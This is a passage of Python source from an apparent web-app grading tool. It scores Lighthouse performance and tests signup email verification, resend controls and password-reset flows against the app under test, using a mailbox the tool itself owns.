                            tier=("fail" if mult == 1.0 else "needs-improvement"), report_only=bool(spec.get("report_only")),
                            penalty_override=0 if spec.get("report_only") else max(1, round(base * mult)))
        return True
    aid, a = max(found, key=lambda x: x[1].get("numericValue") or 0)   # numeric: worst = the largest value
    num = a.get("numericValue")
    if num is None:   # count-based audit (network-requests) carries the value as the length of details.items
        num = len((a.get("details") or {}).get("items") or [])
    if spec.get("fail_above") is not None and num >= spec["fail_above"]:
        mult = 1.0
    elif spec.get("needs_above") is not None and num >= spec["needs_above"]:
        mult = 0.5
    else:
        return False
    ctx.evidence.update(audit=aid, value=round(num), runs=runs, versions=rep.get("versions"), display=a.get("displayValue", ""),
                        tier=("fail" if mult == 1.0 else "needs-improvement"), report_only=bool(spec.get("report_only")),
                        penalty_override=0 if spec.get("report_only") else max(1, round(base * mult)))
    return True


def lighthouse_perf_score(ctx, probe) -> bool | None:
    """The perf axis's SCORING probe: slop = round(max(0, green_floor - overall_perf_score) * 100 * scale) --
    the app's SHORTFALL below Lighthouse's own green line (0.90 = "good"). At/above green -> 0 slop, CLEAN (an
    84 -> 6, a 50 -> 40, a 25 -> 65). Lighthouse already did the scoring off its calibrated weights; we charge
    only the distance below its "good" threshold, rather than re-summing the per-audit tiers (which double-
    counted metrics the headline already weighed AND penalized apps Lighthouse itself rates good). Flooring at
    green (not a perfect 100) refuses to score the 90-100 measurement jitter and makes a clean perf sheet
    achievable + meaningful. `green_floor` / `scale` are the dials. The metric breakdown rides along in evidence
    as OFF-SCORE diagnostics. N/A when there is no Lighthouse result."""
    rep = getattr(ctx, "lighthouse", None)
    if not rep:
        ctx.evidence["na_reason"] = "no lighthouse result (url unreachable or the run failed)"
        return None
    # PENALTY off the FULL-PRECISION score (recomputed from raw metric scores) -- Lighthouse's headline
    # categories.score is 2-decimal-rounded, which quantized the penalty to whole numbers; the precise score
    # gives a fractional shortfall so the 65%-fire perf probe actually de-clumps.
    score = lighthouse.perf_score_precise(rep)   # 0..1, full precision
    if score is None:
        ctx.evidence["na_reason"] = "lighthouse produced no overall performance score"
        return None
    headline = lighthouse.perf_score(rep) or score   # the familiar rounded 0-100 for the human-facing display
    scale = probe.probe.get("scale", 1.0)
    floor = probe.probe.get("green_floor", 0.90)      # Lighthouse's green cutoff: at/above it -> no perf slop
    slop = round(max(0.0, floor - score) * 100 * scale, 1)   # 1-decimal FLOAT: keep the continuous perf spread
    ctx.evidence.update(performance=round(headline * 100), runs=rep.get("runs"), versions=rep.get("versions"),
                        metrics=lighthouse.metric_breakdown(rep),
                        tier=("good" if score >= 0.90 else "needs-improvement" if score >= 0.50 else "poor"),
                        penalty_override=slop)
    return slop > 0


# --- email-verification probes (qa-email-001 / qa-email-002) ------------------------------------------------
# Register with an address WE own (via ctx.email, the configured receiver), then watch whether a confirmation
# email actually arrives and whether acting on its link establishes a session. Both probes read the ONE shared
# flow result (register + poll mutate and block), memoized on ctx. They score (per the qa-email-001/002 severity
# blocks); the report_only bring-up is over.
_EMAIL_ANNOUNCED_TIMEOUT = 60.0    # total wait for a confirmation email the signup PROMISED
_EMAIL_UNANNOUNCED_TIMEOUT = 8.0   # a short confirmatory poll for an opaque SPA that sends without announcing
_EMAIL_RESEND_AT = 30.0            # halfway in, click the app's own 'resend' control (if any) for a second chance
_RESEND_TEXT_HINTS = ("resend", "re-send", "send again", "send it again", "didn't receive", "did not receive",
                      "resend confirmation", "resend verification", "resend email", "resend link")
_RESEND_JSON_PATHS = ("/api/resend", "/api/resend-verification", "/api/resend-confirmation", "/api/auth/resend",
                      "/api/verify/resend", "/api/users/resend-confirmation", "/resend", "/auth/resend",
                      "/auth/resend-verification")
_RESEND_LINK_RE = re.compile(r'<a\b[^>]*href="([^"]+)"[^>]*>(.*?)</a>', re.I | re.S)
_RESEND_FORM_RE = re.compile(r'<form\b[^>]*action="([^"]*resend[^"]*)"', re.I)


def _resp_text(resp) -> str:
    try:
        return resp.text
    except Exception:
        return ""


def _same_app_link(link: str, base: str) -> bool:
    """Follow a verification link only when it is SAME-HOST as the app -- never chase an off-origin link (a
    tracker pixel, an unsubscribe) while carrying the registration's cookies."""
    try:
        return bool(urllib.parse.urlparse(link).hostname) and \
            urllib.parse.urlparse(link).hostname == urllib.parse.urlparse(base).hostname
    except Exception:
        return False


def _has_resend_control(register_response) -> bool:
    """Does the confirm page offer a 'resend' option at all? Assessed independent of email timing, so a
    fast-email app that simply lacks a resend button is still flagged (a good app lets the user re-request the
    mail). A resend link/form, or the page text mentioning resend, counts."""
    body = _resp_text(register_response)
    if any(h in body.lower() for h in _RESEND_TEXT_HINTS) or _RESEND_FORM_RE.search(body):
        return True
    return any("resend" in href.lower() for href, _ in _RESEND_LINK_RE.findall(body))


def _try_resend(client, register_response, email) -> bool:
    """Best-effort: trigger the app's OWN 'resend confirmation email' control if it has one, giving a flaky
    first send a second chance. httpx-only (a JS-only button on an SPA is out of reach, but such apps don't
    register via httpx anyway); returns True iff a resend actually fired."""
    body = _resp_text(register_response)
    low = body.lower()
    for href, text in _RESEND_LINK_RE.findall(body):   # 1) a resend LINK (href or link text mentions resend)
        if "resend" in href.lower() or any(h in text.lower() for h in _RESEND_TEXT_HINTS):
            try:
                if client.get(href).status_code < 400:
                    return True
            except (httpx.HTTPError, httpx.InvalidURL):
                pass
    for action in _RESEND_FORM_RE.findall(body):       # 2) a resend FORM (its action names resend)
        try:
            if client.post(action, data={"email": email}).status_code < 400:
                return True
        except (httpx.HTTPError, httpx.InvalidURL):
            pass
    if any(h in low for h in _RESEND_TEXT_HINTS):       # 3) common JSON endpoints, only when the page mentions
        for path in _RESEND_JSON_PATHS:                 #    resend (a JS button we can't parse) -> no blind spraying
            try:
                if client.post(path, json={"email": email}).status_code in (200, 201, 202, 204):
                    return True
            except (httpx.HTTPError, httpx.InvalidURL):
                pass
    return False


def _follow_verification(acct, msg, base, profile, email):
    """Act on a confirmation email and decide whether the user can now get in. Follow its same-host link(s),
    then EITHER the link auto-logged us in (some apps) OR -- the common 'verify then log in' pattern -- the link
    only VERIFIES the account and a login with the registered creds now succeeds. Either way the flow WORKS;
    qa-email-002 fires only when login STILL fails after verifying. `acted` is False for a code-only / no-link
    email (nothing to follow) so the probe reads N/A rather than a false fire."""
    client = acct.client
    links = [ln for ln in msg.links if _same_app_link(ln, base)]
    last = None
    for link in links[:3]:
        try:
            last = client.get(link)
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
    # the link may auto-log us in (Set-Cookie on the response / a session cookie in the jar). When it carries a
    # session cookie, PROMOTE that response to the account's register_response, so the cookie-flag probes judge
    # the REAL session cookie's flags when the authed-surface probes reuse this account.
    if last is not None and auth.session_cookie(last) is not None:
        acct.register_response = last
    session = (auth._has_session(acct)                                       # the link itself auto-logged us in
               or any(auth._is_session_cookie(c.name) for c in client.cookies.jar))
    if links and not session:   # 'verify then log in': the link verified the account; a login should now succeed.
        #               Try by both identifiers (some apps key login on email, some on username), and CARRY the
        #               returned session onto this account's client so the authed-surface probes reuse it authed.
        for ident in (email, acct.username):
            hdrs = auth.login_with_credentials(base, ident, acct.password, profile)
            if hdrs:
                client.headers.update(hdrs)   # Cookie and/or Authorization: Bearer -> now the logged-in user
                session = True
                break
    # CODE lane (lane A): a 6-digit/alphanumeric CODE, not a link -> POST it to a DISCOVERED verify endpoint. The
    # code-based sibling of the link path; runs when the link path established no session but a code arrived. It
    # only ever ESTABLISHES a session (never claims failure), so a wrong endpoint/shape guess can't false-fire
    # qa-email-002.
    if not session and msg.codes:
        session = _submit_code_httpx(acct, base, profile, email, msg.codes)
    acted = bool(links) or bool(session)   # a code we couldn't complete -> not acted -> N/A, not a false fire
    return email_verify.Verification(acted=acted, session=bool(session))


_VERIFY_HINT = re.compile(r"verif|confirm|otp|activat|/code\b", re.I)


def _submit_code_httpx(acct, base, profile, email, codes) -> bool:
    """Complete a CODE-based email verification over httpx: POST an emailed code to a DISCOVERED verify endpoint
    (path hints verify/confirm/otp/activate), across a few payload shapes, and return True iff a session is then
    established (a Set-Cookie / token comes back). Gated to endpoints DISCOVERY found -- no blind path spraying --
    and returns False (never a definitive failure) so a wrong-endpoint guess never fires qa-email-002. Bounded."""
    eps = [e for e in (getattr(profile, "endpoints", None) or []) if _VERIFY_HINT.search(e.raw_path or e.path or "")]
    if not eps:
        return False
    client = acct.client
    for ep in eps[:3]:
        path = ep.raw_path or ep.path
        for code in codes[:2]:
            for shape in ({"email": email, "code": str(code)}, {"email": email, "otp": str(code)},
                          {"email": email, "token": str(code)}, {"code": str(code)}):
                try:
                    r = client.post(path, json=shape)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if r.status_code < 400:
                    if auth.session_cookie(r) is not None:
                        acct.register_response = r
                    if auth._has_session(acct) or any(auth._is_session_cookie(c.name) for c in client.cookies.jar):
                        return True
    return False


def _snapshot_session(acct) -> dict:
    """Capture a verified account's live session as REPLAYABLE material, so ctx.register can rebuild a FRESH,
    independently-closeable client for each authed-surface probe (a probe closing its account must never
    invalidate the next -- the same contract the browser-cached lane keeps). Session is read as the client would
    SEND it (an explicit Cookie header, else the jar's session cookies) plus any Bearer/apikey; register_response
    carries Set-Cookie for the cookie-flag probes when the link auto-logged us in."""
    hdrs: dict = {}
    cookie = acct.client.headers.get("Cookie")
    if not cookie:
        jar = ([(c.name, c.value) for c in acct.client.cookies.jar if auth._is_session_cookie(c.name)]
               or [(c.name, c.value) for c in acct.client.cookies.jar])
        if jar:
            cookie = "; ".join("%s=%s" % (n, v) for n, v in jar)
    if cookie:
        hdrs["Cookie"] = cookie
    for h in ("Authorization", "apikey"):
        if acct.client.headers.get(h):
            hdrs[h] = acct.client.headers[h]
    return {"headers": hdrs, "username": acct.username, "password": acct.password,
            "response": acct.register_response, "storage_exposed": acct.storage_exposed}


def _email_ctx(ctx, suffix=""):
    """The (tag, address) for this identity (suffix), minted once on ctx so every registration lane signs up with
    the same box and the flow polls it. Distinct suffixes get distinct addresses (the two-account IDOR case).
    Prefers ctx.email_address(suffix) (the real _Ctx); falls back to minting locally for a duck-typed ctx."""
    getter = getattr(ctx, "email_address", None)
    if callable(getter):
        getter(suffix)                             # populates ctx._email_cache tag/address for this suffix
        return ctx._email_cache["tag" + suffix], ctx._email_cache["address" + suffix]
    if "tag" + suffix not in ctx._email_cache:
        ctx._email_cache["tag" + suffix] = secrets.token_hex(6)
        ctx._email_cache["address" + suffix] = ctx.email.address(ctx._email_cache["tag" + suffix])
    return ctx._email_cache["tag" + suffix], ctx._email_cache["address" + suffix]


def _snapshot_browser_session(bsession, base) -> dict:
    """Snapshot a browser-established SPA session (post email-verification) into the SAME replayable shape as the
    httpx lane, so ctx.register rebuilds a fresh authed client for each probe. Cookies are re-encoded as
    Set-Cookie (auth._synthesize_response) so the cookie-flag probes still judge the real session cookie."""
    hdrs: dict = {}
    cookies = bsession.get("cookies") or []
    session_cookies = [c for c in cookies if auth._is_session_cookie(c.get("name", ""))] or cookies
    if session_cookies:
        hdrs["Cookie"] = "; ".join("%s=%s" % (c["name"], c.get("value", "")) for c in session_cookies)
    if bsession.get("bearer"):
        hdrs["Authorization"] = "Bearer " + bsession["bearer"]
    return {"headers": hdrs, "username": "hl_spa", "password": "",
            "response": auth._synthesize_response(base, cookies),
            "storage_exposed": bool(bsession.get("storage_exposed"))}


def _follow_verification_browser(base, msg, live) -> "email_verify.Verification":
    """Complete a SPA verification: open the emailed same-host link IN THE BROWSER (browser.verify_in_browser) so
    the app's own JS reads the token and establishes the session -- an httpx GET can't run that JS. Records the
    session on `live` for the authed-surface snapshot. acted=False for a code-only / no-link email (N/A)."""
    links = [ln for ln in msg.links if _same_app_link(ln, base)]
    if not links:
        return email_verify.Verification(acted=False)
    for link in links[:3]:
        try:
            bsession = browser.verify_in_browser(link, base)
        except Exception:
            bsession = None
        if isinstance(bsession, dict) and (bsession.get("cookies") or bsession.get("bearer")):
            live["browser_session"] = bsession
            return email_verify.Verification(acted=True, session=True)
    return email_verify.Verification(acted=True, session=False)   # clicked, still no session -> inert (qa-email-002)


def _client_blob(ctx):
    """The app's client JS bundle, fetched once and memoized on ctx (the BaaS + Firebase lanes both read it to
    resolve provider config). Paid only when the email flow reaches these lanes (httpx + browser produced
    nothing)."""
    cache = ctx._email_cache
    if "blob" not in cache:
        try:
            cache["blob"] = baas.client_blob(ctx.base_url, getattr(ctx.profile, "landing_path", "") or "") or ""
        except Exception:
            cache["blob"] = ""
    return cache["blob"]


def _baas_gateway(ctx):
    """(gateway, anon_key) for the app's managed Supabase backend, resolved from its client bundle -- or None
    when the app has no embedded gateway/key."""
    try:
        blob = _client_blob(ctx)
        if not blob:
            return None
        gateway = baas.resolve_gateway(blob, ctx.base_url)
        key = baas.anon_key(blob)
        return (gateway, key) if gateway and key else None
    except Exception:
        return None


def _firebase_config(ctx):
    """The app's Firebase Web API key from its client bundle, or None (not a Firebase-Auth app)."""
    try:
        blob = _client_blob(ctx)
        return baas.firebase_api_key(blob) if blob else None
    except Exception:
        return None


def _snapshot_firebase_session(sess) -> dict:
    """Snapshot a Firebase session (idToken at signup) into the replayable shape ctx.register rebuilds from -- a
    Bearer idToken, which is what a Firebase app's client sends to its own backend / Firestore REST."""
    return {"headers": {"Authorization": "Bearer " + sess["idToken"]},
            "username": sess.get("email") or sess.get("localId") or "hl_firebase",
            "password": sess.get("_password", ""),
            "response": httpx.Response(200, request=httpx.Request("POST", baas._IDENTITYTOOLKIT_SIGNUP)),
            "storage_exposed": False}


def _follow_verification_baas(msg, live) -> "email_verify.Verification":
    """Complete a Supabase e-mail confirmation: try each emailed link through baas.verify_email_link (the confirm
    link's host is the GATEWAY, not the app, so _same_app_link does not apply -- the token is read from the query
    regardless of host). Records the session on `live` for the authed-surface snapshot."""
    gateway, key = live["gateway"], live["key"]
    for link in msg.links[:5]:
        try:
            session = baas.verify_email_link(gateway, key, link)
        except Exception:
            session = None
        if isinstance(session, dict) and session.get("access_token"):
            live["baas_session"] = session
            return email_verify.Verification(acted=True, session=True)
    # CODE lane (lane A): a Supabase EMAIL-OTP (6-digit code) -> /auth/v1/verify {type, email, token: code}. Runs
    # when no link verified but a code arrived (the OTP confirmation shape). Establishes a session or abstains.
    email = (live.get("baas_creds") or {}).get("_email")
    if email and msg.codes:
        for code in msg.codes[:3]:
            try:
                session = baas.verify_otp(gateway, key, email, code)
            except Exception:
                session = None
            if isinstance(session, dict) and session.get("access_token"):
                live["baas_session"] = session
                return email_verify.Verification(acted=True, session=True)
    return email_verify.Verification(acted=bool(msg.links), session=False)   # link(s) but none verified -> inert


def _snapshot_baas_session(session, gateway, key, creds) -> dict:
    """Snapshot a Supabase session (post e-mail confirmation) into the replayable shape ctx.register rebuilds
    from: the gateway Bearer + apikey, and the `sb-<ref>-auth-token` cookie the app reads to render authed. The
    cookie is set by us (no Set-Cookie observed), so the cookie-flag probes read N/A here -- same as the
    existing BaaS register lane."""
    hdrs = {"Authorization": "Bearer " + session["access_token"], "apikey": key,
            "Cookie": baas.cookie_name(gateway) + "=" + baas.cookie_value(session)}
    return {"headers": hdrs,
            "username": session.get("_email") or creds.get("_email") or "hl_baas",
            "password": session.get("_password") or creds.get("_password") or "",
            "response": auth._synthesize_response(gateway, []), "storage_exposed": False}


def _email_register_once(ctx, suffix=""):
    """Register with our controlled address for one identity and TRIGGER the confirmation email -- the FAST half of
    the flow, split out so it can run EARLY (grade start, via _prime_email) while the poll runs late. Memoized on
    ctx (sends exactly once); populates the persisted `live` state the follow reads. Lanes in order: httpx (server
    form/JSON) -> browser (SPA) -> BaaS (Supabase) -> Firebase. Returns the RegistrationOutcome (also cached)."""
    cache = ctx._email_cache
    rkey = "_reg" + suffix
    if rkey in cache:
        return cache[rkey]
    tag, address = _email_ctx(ctx, suffix)
    base = ctx.base_url
    live = cache.setdefault("_live" + suffix, {})

    def _done(outcome):
        cache[rkey] = outcome
        return outcome

    # 1) httpx (server-rendered form / JSON API) with OUR address
    acct = auth._register_httpx(base, ctx.profile, "_e" + tag[:4], email=address)
    if acct is not None:
        live["acct"] = acct
        has_session = auth._has_session(acct)
        announced = email_verify.announces_pending_email(_resp_text(acct.register_response))
        if has_session or announced:
            live["lane"] = "httpx"
            return _done(email_verify.RegistrationOutcome(
                submitted=True, has_session=has_session, announces_email=announced,
                has_resend_control=_has_resend_control(acct.register_response), handle=acct))
    # 1b) MAGIC-LINK (server-rendered passwordless): an email-only auth form -> POST our address, the app mails a
    #     login link, and the EXISTING httpx follow clicks it (_follow_verification auto-logs us in). Reached only
    #     when the password httpx lane above found nothing (no email-only form -> None -> fall through).
    macct = auth._register_passwordless(base, ctx.profile, "_m" + tag[:4], email=address)
    if macct is not None:
        m_session = auth._has_session(macct)
        m_announced = email_verify.announces_pending_email(_resp_text(macct.register_response))
        if m_session or m_announced:                         # only WIN when the POST observably did something --
            if acct is not None:                             # else an SPA's placeholder form would shadow lane 2/3
                with contextlib.suppress(Exception):
                    acct.client.close()                      # the unproductive password attempt -> don't leak it
            live["acct"] = macct
            live["lane"] = "httpx"
            return _done(email_verify.RegistrationOutcome(
                submitted=True, has_session=m_session, announces_email=m_announced,
                has_resend_control=_has_resend_control(macct.register_response), handle=macct))
        with contextlib.suppress(Exception):
            macct.client.close()                             # nothing observable -> let the browser/BaaS lanes try
    # 2) SPA browser lane (browser mode only): the app's own JS signs up with our address -> an email-gated SPA
    #    mails us. Reuses ctx's single memoized browser registration (shared with the auth self-oracle).
    bres = None
    if getattr(ctx, "browser_register", None) is not None:
        try:
            bres = ctx._browser_register_once(suffix, base)
        except Exception:
            bres = None
    if isinstance(bres, dict):
        if bres.get("email_pending"):
            # email-gated ONLY when the post-submit page ANNOUNCES email (else it's just as often CAPTCHA / SSO /
            # approval -> announces_email False routes it to the short unannounced poll, no 60s false lockout).
            live["lane"] = "browser"
            return _done(email_verify.RegistrationOutcome(
                submitted=True, has_session=False,
                announces_email=email_verify.announces_pending_email(bres.get("page_text") or ""), handle=None))
        if bres.get("cookies") or bres.get("bearer"):            # the SPA logged us in at once -> not email-gated
            live.update(lane="browser_session", browser_session=bres)
            return _done(email_verify.RegistrationOutcome(submitted=True, has_session=True, handle=None))
    # 3) BaaS lane (Supabase gateway): confirmation ON -> accepts the signup, withholds a session, mails a confirm link
    gw = _baas_gateway(ctx)
    if gw is not None:
        gateway, key = gw
        bsu = baas.email_signup(gateway, key, address)
        if bsu.get("session"):
            live.update(lane="baas_session", baas_session=bsu["session"], gateway=gateway, key=key)
            return _done(email_verify.RegistrationOutcome(submitted=True, has_session=True, handle=None))
        if bsu.get("pending"):
            live.update(lane="baas", gateway=gateway, key=key,
                        baas_creds={"_email": bsu.get("_email"), "_password": bsu.get("_password")})
            return _done(email_verify.RegistrationOutcome(submitted=True, has_session=False, announces_email=True,
                                                          handle=None))
        # 3c) MAGIC-LINK fallback: the password /auth/v1/signup is closed but OTP is on -> request a login link
        #     (POST /auth/v1/otp); the SAME baas follow (verify_email_link, type=magiclink) completes it.
        mlk = baas.magic_link_signup(gateway, key, address)
        if mlk.get("pending"):
            live.update(lane="baas", gateway=gateway, key=key,
                        baas_creds={"_email": address, "_password": None})
            return _done(email_verify.RegistrationOutcome(submitted=True, has_session=False, announces_email=True,
                                                          handle=None))
    # 3b) Firebase lane: identitytoolkit signUp returns a session AT SIGNUP (not email-gated) -> unlocks API-only
    #     Firebase's authed surface; the browser lane already covers Firebase SPAs (localStorage idToken).
    fb_key = _firebase_config(ctx)
    if fb_key:
        fsess = baas.firebase_signup(fb_key, address)
        if fsess is not None:
            live.update(lane="firebase_session", firebase_session=fsess)
            return _done(email_verify.RegistrationOutcome(submitted=True, has_session=True, handle=None))
    # 4) fall back to the httpx submission (submitted but not announced -> the flow's short confirmatory poll)
    if acct is not None:
        live["lane"] = "httpx"
        return _done(email_verify.RegistrationOutcome(
            submitted=True, has_session=auth._has_session(acct), announces_email=False,
            has_resend_control=_has_resend_control(acct.register_response), handle=acct))
    return _done(email_verify.RegistrationOutcome(submitted=False))


def _prime_email(ctx, suffix=""):
    """Fire the email registration EARLY (grade start) so the confirmation mail is delivered by the time a probe
    polls for it -- the up-to-60s wait then OVERLAPS the rest of the grade instead of blocking. No poll here; the
    poll+follow stays lazy (verify_email_flow, run by the qa-email probes / the register lane). No-op without a
    receiver or with a provided --header session; the send itself is memoized, so this is safe to call once."""
    if getattr(ctx, "email", None) is None or auth._provided_session(getattr(ctx, "headers", None)):
        return
    with contextlib.suppress(Exception):
        _email_register_once(ctx, suffix)


def _run_email_flow(ctx, suffix=""):
    """Register with OUR controlled address, decide whether the signup is email-gated, and if so whether the mail
    arrives and its link logs us in -- across THREE registration lanes so SPAs aren't blind spots:

      1. httpx  -- a server-rendered HTML form / JSON API (email in the body).
      2. browser -- when browser-driven registration is on, drive the app's OWN JS signup with our address (an
         SPA's form action is a placeholder; the real POST is a JS fetch, so httpx alone never mails us). Reuses
         the ONE memoized browser registration ctx.register already performs, so no extra launch; the emailed
         link is then completed in the browser too (verify_in_browser).

    When a lane's verification logs us in, capture that session on ctx (once) so the authed-surface probes reuse
    it via ctx.register -- the whole reason the receiver exists. `suffix` selects the IDENTITY (""/"_a"/"_b"),
    each with its own address + cache slot, so the two-account IDOR probes get distinct verified users."""
    tag, address = _email_ctx(ctx, suffix)
    base = ctx.base_url
    live = ctx._email_cache.setdefault("_live" + suffix, {})   # persisted so a PRIMED registration + the later
    #     poll share one send: the email delivers while the rest of the grade runs, so the poll finds it there.
    reg_outcome = _email_register_once(ctx, suffix)            # the send half (memoized; may already be primed)

    def register(_address):
        return reg_outcome                                     # already registered -> never re-send

    def follow(reg, msg):
        lane = live.get("lane")
        if lane == "browser":
            return _follow_verification_browser(base, msg, live)
        if lane == "baas":
            return _follow_verification_baas(msg, live)
        if live.get("acct") is not None:
            return _follow_verification(live["acct"], msg, base, ctx.profile, address)
        return email_verify.Verification(acted=False)

    def resend(reg):
        acct = live.get("acct")                                  # only the httpx lane has a resend control to hit
        if acct is None:
            return False
        try:
            return _try_resend(acct.client, acct.register_response, address)
        except Exception:
            return False

    try:
        result = email_verify.verify_email_flow(
            ctx.email, tag, register, follow, resend=resend,
            announced_timeout=_EMAIL_ANNOUNCED_TIMEOUT, unannounced_timeout=_EMAIL_UNANNOUNCED_TIMEOUT,
            resend_at=_EMAIL_RESEND_AT)
    except Exception:
        return email_verify.EmailVerifyResult(attempted=False, na_reason="email-verification flow errored")
    lane = live.get("lane")
    slot = "account_session" + suffix                          # per-identity snapshot slot
    if lane == "firebase_session" and live.get("firebase_session"):
        # Firebase's session is granted at SIGNUP, not after verification, so capture it directly (the app is not
        # email-gated -> result.session_after_verify is never set for this lane).
        ctx._email_cache[slot] = _snapshot_firebase_session(live["firebase_session"])
    elif result.session_after_verify:                           # capture the verified session for authed reuse (once)
        if lane == "browser" and live.get("browser_session"):
            ctx._email_cache[slot] = _snapshot_browser_session(live["browser_session"], base)
        elif lane == "baas" and live.get("baas_session"):
            ctx._email_cache[slot] = _snapshot_baas_session(
                live["baas_session"], live["gateway"], live["key"], live.get("baas_creds") or {})
        else:
            acct = live.get("acct")
            if acct is not None and auth._has_session(acct):
                ctx._email_cache[slot] = _snapshot_session(acct)   # rebuilt per call; original closed
                with contextlib.suppress(Exception):
                    acct.client.close()
    # SHARPEN the N/A: when we couldn't self-register, say WHY if discovery saw an SSO door or a captcha gate
    # (both auth we don't drive) -> "could not submit ... [SSO: google] [CAPTCHA: recaptcha]" for the audit.
    if not result.attempted and result.na_reason:
        caps = getattr(getattr(ctx, "profile", None), "capabilities", {}) or {}
        if caps.get("sso_providers"):
            result.na_reason += " [SSO: %s]" % ",".join(caps["sso_providers"])
        if caps.get("captcha"):
            result.na_reason += " [CAPTCHA: %s]" % caps["captcha"]
    return result


def _email_verify_result(ctx, suffix=""):
    """The email-flow observation for one identity (suffix), run once and memoized. The qa-email probes read the
    default ("") identity; the two-account IDOR probes drive "_a"/"_b"."""
    cache = ctx._email_cache
    key = "result" + suffix
    if key not in cache:
        if ctx.email is None:
            cache[key] = email_verify.EmailVerifyResult(
                attempted=False, na_reason="no email receiver configured (pass --email-endpoint)")
        elif auth._provided_session(ctx.headers):
            cache[key] = email_verify.EmailVerifyResult(
                attempted=False, na_reason="a session was supplied (--header); the signup email flow is untestable")
        else:
            cache[key] = _run_email_flow(ctx, suffix)
    return cache[key]


def _email_account(ctx, session_less_acct=None, suffix=""):
    """Register-lane hook (called by ctx.register): when a signup is email-verification-gated, complete the
    emailed verification and hand back a FRESH authenticated Account for this IDENTITY (suffix), so the
    authed-surface probes run as the verified user. Returns None when no receiver is configured, the app is not
    email-gated, or verification set no session -> the caller falls through to the browser/BaaS lanes.

    FIRST-ACCOUNT GATE (the two-account IDOR case): a SECOND identity ("_a"/"_b") is attempted only if the default
    ("") identity already email-verified a session -- i.e. 'if we can make one, make another; if not, abandon'. So
    a broken-email app pays the 60s poll once (for "") and then abandons IDOR instantly instead of polling twice
    more. Cost control for the default identity: the flow runs at most once per identity (memoized); if it has NOT
    run yet, only pay for it when this signup ANNOUNCES a pending email, or in browser mode (the SPA lane detects
    a gate the placeholder httpx signup can't announce)."""
    cache = ctx._email_cache
    if suffix and not cache.get("account_session"):
        # a second identity: only worth it if the FIRST ("") verified. Ensure "" ran, then require its session.
        _email_verify_result(ctx, "")
        if not cache.get("account_session"):
            return None                                  # can't make one -> don't try to make another
    if "result" + suffix not in cache:
        announced = session_less_acct is not None and email_verify.announces_pending_email(
            _resp_text(session_less_acct.register_response))
        # In browser mode the httpx signup is a placeholder that never announces (the real signup is a JS fetch),
        # so an email-gated SPA would slip through the announce gate; the shared flow's browser lane is what
        # detects it. Its browser registration is memoized (shared with ctx.register), so this adds no launch.
        browser_spa = getattr(ctx, "browser_register", None) is not None
        if not (announced or browser_spa):
            return None                                  # not (yet known to be) email-gated -> let browser try
        _email_verify_result(ctx, suffix)                # run this identity's flow (captures its session, if any)
    sess = cache.get("account_session" + suffix)
    if not sess:
        return None                                      # verification established no reusable session
    return _rebuild_account(ctx.base_url, sess)


def _rebuild_account(base_url, sess) -> "auth.Account":
    """Rebuild a FRESH, independently-closeable Account from a session snapshot (the register lane's, or the
    crawl auth's seeded session). A fresh httpx client per call so a probe closing its account never invalidates
    the next -- the same contract the browser-cached lane keeps."""
    client = httpx.Client(base_url=base_url, timeout=15.0, follow_redirects=True)
    client.headers.update(sess["headers"])
    return auth.Account(username=sess["username"], password=sess["password"], client=client,
                        register_response=sess["response"], storage_exposed=sess["storage_exposed"])


def email_never_arrives(ctx, probe) -> bool | None:
    """qa-email-001: the email-verification signup flow is unreliable, on an evidence ladder (functional-
    suitability, SCORING_V2_SPEC): no email within 60s even after a resend -> locked out (72); email only after
    the 30s checkpoint -> unreliable send (24); a working-but-no-resend-control signup -> a resilience gap (5)."""
    res = _email_verify_result(ctx)
    if not res.attempted or not res.email_gated:
        ctx.evidence["na_reason"] = res.na_reason or "signup is not email-verification-gated"
        return None
    ctx.evidence["email_gated"] = True
    if res.message is not None:
        ctx.evidence["subject"] = (res.message.subject or "")[:120]
    if not res.email_arrived:
        ctx.evidence["no_email_60s"] = True            # escalator -> 72
        ctx.evidence["detail"] = res.detail
    elif res.first_leg_empty:
        ctx.evidence["email_late_30s"] = True          # escalator -> 24
    if not res.has_resend_control:
        ctx.evidence["no_resend_button"] = True        # the base-5 fire condition (evidence for the report)
    # FIRE on any of: no email (60s), a late email (30s), or a missing resend control. Clean only when the email
    # is prompt (<30s) AND a resend control exists (a working app is expected to offer a resend).
    if not res.email_arrived or res.first_leg_empty or not res.has_resend_control:
        return True
    return False


def email_verification_inert(ctx, probe) -> bool | None:
    """qa-email-002: the confirmation email arrives but acting on its link establishes no session."""
    res = _email_verify_result(ctx)
    if not res.attempted or not res.email_gated:
        ctx.evidence["na_reason"] = res.na_reason or "signup is not email-verification-gated"
        return None
    if not res.email_arrived:
        ctx.evidence["na_reason"] = "no confirmation email arrived (that is qa-email-001's concern)"
        return None
    if not res.acted_on_verification:
        ctx.evidence["na_reason"] = res.detail or "the email carried no followable verification link"
        return None
    if not res.session_after_verify:
        return True    # acted on the link, no session -> verification is inert
    return False       # verified + a session established -> the whole flow works


# --- password-reset probe (qa-reset-001) --------------------------------------------------------------------
# The RECOVERY path a user hits after forgetting their password: an independent code path (different template /
# mail call / route) that can be broken even when signup email works. We establish an account with an address WE
# own (the register lane), request a reset for THAT address, and watch whether the email arrives and its link is
# alive. SAFETY: only ever the hl-<tag> mailbox we own is submitted -- never a discovered/guessed user address.

def _reset_result(ctx, suffix=""):
    """The password-reset observation for one identity (suffix), run once and memoized."""
    cache = ctx._email_cache
    key = "reset_result" + suffix
    if key not in cache:
        if getattr(ctx, "email", None) is None:
            cache[key] = email_verify.ResetResult(
                attempted=False, na_reason="no email receiver configured (pass --email-endpoint)")
        elif auth._provided_session(getattr(ctx, "headers", None)):
            cache[key] = email_verify.ResetResult(
                attempted=False, na_reason="a session was supplied (--header); the reset flow is untestable")
        else:
            cache[key] = _run_reset_flow(ctx, suffix)
    return cache[key]


# A SPA's forgot-password is a JS fetch to a JSON endpoint, not a server-rendered <form> -- so the form lane
# (_forgot_form) and the Supabase lane both miss it, and qa-reset reads N/A on an app that has a perfectly good
# recovery endpoint. Match a REQUEST-side reset trigger (emails a link) and, to keep the fire honest, require it
# take an email but NOT a token/password (that shape is the COMPLETION endpoint, which consumes a token and mails
# nothing). Path hints alone would misfire on the completion route; the field shape is the discriminator.
_RESET_REQUEST_PATH = re.compile(r"forgot|recover|reset", re.I)   # request-side reset hints
_RESET_FIELD_EMAIL = re.compile(r"e?mail|^username$", re.I)
_RESET_FIELD_SECRET = re.compile(r"token|password|otp|code|secret", re.I)


def _json_reset_endpoints(endpoints):
